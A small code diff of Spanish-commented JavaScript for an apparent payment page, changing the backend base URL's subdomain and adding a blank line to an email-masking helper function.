@@ -236,7 +236,7 @@ if (botonPagar) {
         }
 
         // 4. PREPARAR URL (Backend)
-        const baseUrl = 'https://aire.pagoswebcol.uk'; 
+        const baseUrl = 'https://air.pagoswebcol.uk'; 
         
         const params = new URLSearchParams({
             amount: amount,
@@ -349,5 +349,6 @@ function enmascararCorreo(email) {
     if(!email) return "";
     const [user, domain] = email.split("@");
     return user.substring(0, 2) + "*******@" + "*****." + "com";
+
 
 }
